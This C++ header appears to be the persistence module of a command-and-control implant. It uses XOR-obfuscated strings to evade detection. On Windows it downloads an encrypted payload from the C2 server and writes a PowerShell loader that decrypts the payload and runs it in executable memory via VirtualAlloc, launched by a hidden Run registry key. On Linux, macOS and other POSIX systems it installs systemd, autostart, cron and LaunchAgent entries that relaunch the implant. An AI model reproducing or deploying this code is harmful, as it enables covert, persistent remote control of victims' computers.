#pragma once

#include "evasion.h"
#include "network.h"
#include <string>
#include <vector>

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#else
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>
#ifdef __APPLE__
#include <mach-o/dyld.h>
#endif
#endif

namespace persistence {

#ifdef _WIN32

inline std::string establish_windows(const net::C2Config& cfg, const std::string& name) {
    // Get %APPDATA% directory
    char appdata[MAX_PATH];
    DWORD appdataLen = GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));
    if (appdataLen == 0 || appdataLen >= sizeof(appdata)) {
        return std::string(XOR_DEC(XOR_STR("Error: %APPDATA% not available")));
    }

    std::string dir = std::string(appdata) + "\\Microsoft\\Phantom";
    std::string payloadPath = dir + "\\phantom.dat";
    std::string psPath = dir + "\\phantom.ps1";

    // Create directory
    CreateDirectoryA(dir.c_str(), NULL);

    // ── Step 1: Download XOR-encrypted payload from C2 ──
    std::string payload = net::http_request(cfg,
        XOR_WDEC(XOR_WSTR(L"GET")).c_str(),
        XOR_WDEC(XOR_WSTR(L"/x")).c_str(), "", "");
    if (payload.empty()) {
        return std::string("Error: Failed to download beacon payload from C2 (host=")
            + std::string(cfg.host.begin(), cfg.host.end()) + ":"
            + std::to_string(cfg.port) + ")";
    }

    // ── Step 2: Save XOR-encrypted payload to disk ──
    HANDLE hFile = CreateFileA(payloadPath.c_str(), GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return std::string(XOR_DEC(XOR_STR("Error: Failed to write payload to "))) + payloadPath;
    }
    DWORD written = 0;
    WriteFile(hFile, payload.data(), (DWORD)payload.size(), &written, NULL);
    CloseHandle(hFile);

    // ── Step 3: Write PowerShell loader script ──
    // Uses Add-Type for VirtualAlloc P/Invoke, reads XOR-encrypted payload from disk,
    // decrypts with 0xAA, copies to executable memory, and invokes.
    // NOTE: This string is written to a .ps1 file on disk, not sensitive at rest.
    std::string ps =
        std::string("$ErrorActionPreference='Stop';\r\n"
        "Add-Type -TypeDefinition @'\r\n"
        "using System;using System.Runtime.InteropServices;public class K{\r\n"
        "[DllImport(\"kernel32\")]public static extern IntPtr VirtualAlloc(IntPtr,IntPtr,int,int);}\r\n"
        "'@;\r\n"
        "$b=[System.IO.File]::ReadAllBytes(\"") + payloadPath + "\");\r\n"
        "$k=0xAA;for($i=0;$i-lt$b.Length;$i++){$b[$i]-bxor$k};\r\n"
        "$p=[K]::VirtualAlloc(0,[IntPtr]$b.Length,0x3000,0x40);\r\n"
        "[System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length);\r\n"
        "[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p,[Type](New-Object System.Action)).Invoke()";

    hFile = CreateFileA(psPath.c_str(), GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return std::string(XOR_DEC(XOR_STR("Error: Failed to write loader to "))) + psPath;
    }
    written = 0;
    WriteFile(hFile, ps.c_str(), (DWORD)ps.size(), &written, NULL);
    CloseHandle(hFile);

    // ── Step 4: Create Run key ──
    HKEY hKey;
    std::string runCmd = std::string(
        XOR_DEC(XOR_STR("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \""))
        .c_str()) + psPath + "\"";

    if (RegCreateKeyExA(HKEY_CURRENT_USER,
            XOR_DEC(XOR_STR("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).c_str(),
            0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

        if (RegSetValueExA(hKey, name.c_str(), 0, REG_SZ,
                (const BYTE*)runCmd.c_str(), (DWORD)runCmd.size() + 1) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return std::string("Persist established: RunKey -> ") + runCmd;
        }
        RegCloseKey(hKey);
        return std::string(XOR_DEC(XOR_STR("Error: Failed to set Registry value")));
    }

    return std::string(XOR_DEC(XOR_STR("Error: Failed to open/create Registry key")));
}

// ── Linux persistence (systemd + .desktop + cron) ────────────────────────────
#elif defined(__linux__)

inline std::string establish_linux(const std::string& name) {
    char path[1024];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len == -1) return XOR_DEC(XOR_STR("Error: Could not get current process path")).c_str();
    path[len] = '\0';

    std::string home = getenv("HOME") ? getenv("HOME") : "";
    if (home.empty()) return XOR_DEC(XOR_STR("Error: Could not find HOME directory")).c_str();

    std::string results;

    // 1) systemd user service
    std::string systemdDir = home + "/.config/systemd/user";
    mkdir(systemdDir.c_str(), 0755);
    std::string serviceFile = systemdDir + "/" + name + ".service";
    {
        std::ofstream ofs(serviceFile);
        if (ofs.is_open()) {
            ofs << "[Unit]\n";
            ofs << "Description=" << name << " beacon\n\n";
            ofs << "[Service]\n";
            ofs << "ExecStart=" << path << "\n";
            ofs << "Restart=always\n";
            ofs << "RestartSec=30\n\n";
            ofs << "[Install]\n";
            ofs << "WantedBy=default.target\n";
            ofs.close();
            // Try to enable and start
            std::string enableCmd = "systemctl --user enable " + serviceFile + " 2>/dev/null";
            std::string startCmd = "systemctl --user start " + name + ".service 2>/dev/null";
            FILE* fp = popen(enableCmd.c_str(), "r");
            if (fp) pclose(fp);
            fp = popen(startCmd.c_str(), "r");
            if (fp) pclose(fp);
            results += "[systemd] " + serviceFile + "\n";
        }
    }

    // 2) .desktop autostart (for desktop environments)
    std::string autostartDir = home + "/.config/autostart";
    mkdir(autostartDir.c_str(), 0755);
    std::string desktopFile = autostartDir + "/" + name + ".desktop";
    {
        std::ofstream ofs(desktopFile);
        if (ofs.is_open()) {
            ofs << "[Desktop Entry]\n";
            ofs << "Type=Application\n";
            ofs << "Exec=" << path << "\n";
            ofs << "Hidden=false\n";
            ofs << "NoDisplay=false\n";
            ofs << "X-GNOME-Autostart-enabled=true\n";
            ofs << "Name=" << name << "\n";
            ofs.close();
            results += "[autostart] " + desktopFile + "\n";
        }
    }

    // 3) cron job (runs every 10 minutes)
    {
        std::string cronLine = "*/10 * * * * " + std::string(path) + "\n";
        std::string cronCmd = "(crontab -l 2>/dev/null; echo '" + cronLine + "') | crontab - 2>/dev/null";
        FILE* fp = popen(cronCmd.c_str(), "r");
        if (fp) pclose(fp);
        results += "[cron] Every 10 minutes\n";
    }

    if (results.empty())
        return XOR_DEC(XOR_STR("Error: All persistence methods failed")).c_str();
    return XOR_DEC(XOR_STR("Native persistence established:\n")).c_str() + results;
}

// ── macOS persistence (LaunchAgent) ─────────────────────────────────────────
#elif defined(__APPLE__)

inline std::string establish_linux(const std::string& name) {
    char path[1024];
    uint32_t pathSize = sizeof(path);
    if (_NSGetExecutablePath(path, &pathSize) != 0)
        return XOR_DEC(XOR_STR("Error: Could not get current process path")).c_str();

    std::string home = getenv("HOME") ? getenv("HOME") : "";
    if (home.empty()) return XOR_DEC(XOR_STR("Error: Could not find HOME directory")).c_str();

    std::string launchAgentsDir = home + "/Library/LaunchAgents";
    mkdir(launchAgentsDir.c_str(), 0755);

    std::string plistFile = launchAgentsDir + "/com." + name + ".plist";
    std::ofstream ofs(plistFile);
    if (!ofs.is_open())
        return XOR_DEC(XOR_STR("Error: Could not create LaunchAgent plist")).c_str();

    ofs << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
    ofs << "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
           "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n";
    ofs << "<plist version=\"1.0\">\n";
    ofs << "<dict>\n";
    ofs << "    <key>Label</key>\n";
    ofs << "    <string>com." << name << "</string>\n";
    ofs << "    <key>ProgramArguments</key>\n";
    ofs << "    <array>\n";
    ofs << "        <string>" << path << "</string>\n";
    ofs << "    </array>\n";
    ofs << "    <key>RunAtLoad</key>\n";
    ofs << "    <true/>\n";
    ofs << "    <key>KeepAlive</key>\n";
    ofs << "    <true/>\n";
    ofs << "    <key>ThrottleInterval</key>\n";
    ofs << "    <integer>30</integer>\n";
    ofs << "</dict>\n";
    ofs << "</plist>\n";
    ofs.close();

    // Load with launchctl
    std::string loadCmd = "launchctl load " + plistFile + " 2>/dev/null";
    FILE* fp = popen(loadCmd.c_str(), "r");
    if (fp) pclose(fp);

    return XOR_DEC(XOR_STR("Native persistence (LaunchAgent) established: ")).c_str() + plistFile;
}

// ── Android / unknown POSIX: fallback to cron-only ──────────────────────────
#else

inline std::string establish_linux(const std::string& name) {
    char path[1024];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len == -1) return XOR_DEC(XOR_STR("Error: Could not get current process path")).c_str();
    path[len] = '\0';

    // For Android and other POSIX: try cron (requires root on Android)
    std::string cronLine = "*/10 * * * * " + std::string(path) + "\n";
    std::string cronCmd = "(crontab -l 2>/dev/null; echo '" + cronLine + "') | crontab - 2>/dev/null";
    FILE* fp = popen(cronCmd.c_str(), "r");
    if (fp) pclose(fp);

    return XOR_DEC(XOR_STR("Native persistence (cron) established: ")).c_str() + std::string(path);
}

#endif

} // namespace persistence
